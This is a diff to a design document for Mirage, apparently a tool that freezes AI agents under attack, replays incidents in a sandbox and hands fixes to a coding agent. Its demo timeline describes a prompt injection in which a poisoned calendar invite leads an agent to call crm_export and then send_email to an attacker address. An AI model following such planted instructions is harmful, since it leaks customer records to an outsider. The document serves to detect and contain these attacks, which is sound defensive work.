@@ -188,11 +188,12 @@ Why freeze and not kill: a false freeze costs one human click. So we can use a l
 
 ### One click
 
-The user uses the coding agent they prefer. Mirage does not choose it.
-The incident page has two buttons:
+Mirage does not write the fix. The user's own coding agent does. Mirage does not choose it.
+The incident page has one button: **Hand off to coding agent**. It opens a drawer with:
 
-- **Copy prompt.** Copies a full prompt to the clipboard. The user pastes it into any coding agent.
-- **Send to Codex.** Opens a Codex task with the same prompt.
+- **Open in Claude Code / Open in Codex.** Copies the full prompt and opens the agent in a new tab.
+  The user pastes the prompt.
+- **Copy prompt.** Copies the prompt for any other coding agent. The prompt is shown read-only.
 
 ### The prompt contains
 
@@ -262,7 +263,7 @@ We build story 1 fully. Story 2 reuses the same engine. Story 3 is short.
 | 0:30 | Agent 2 reads the poisoned invite. It calls `crm_export` then `send_email(to=attacker@...)`. The card turns red: FROZEN. Agents 1 and 3 continue. The real outbox is empty. Mirage automatically queues three sandbox replays. |
 | 1:00 | Incident view. Timeline, the rule that fired, the decision model score. |
 | 1:20 | The automatic detonation finishes in Mirage. The Mirage lane lights up. "3/3 runs: 40 records to attacker@...". Bisection grid: only the calendar event flips the result. |
-| 2:00 | Click "Send to Codex" or "Copy prompt". The coding agent runs `mirage detonate`. Result goes green: attack blocked 3/3, task done 3/3. |
+| 2:00 | Click "Hand off to coding agent", then "Open in Claude Code" or "Open in Codex". The coding agent runs `mirage detonate`. Result goes green: attack blocked 3/3, task done 3/3. |
 | 2:40 | PR opens on GitHub with report and regression test. A human merges it. A human approves the clean restart. |
 
 The global STOP button is visible during the full demo.
@@ -312,7 +313,7 @@ Each step must run before we start the next one.
 8. Bisection.
 9. Decision model (layer 2) in the gate.
 10. Mirage MCP server + HTTP API + incident token.
-11. Coding agent handoff: Copy prompt + Send to Codex. Test the full loop.
+11. Coding agent handoff: Open in Claude Code / Open in Codex + Copy prompt. Test the full loop.
 12. UI.
 13. Story 2 and story 3.
 14. Metrics on the test set (detection rate, false positives, time to detect, time to contain).
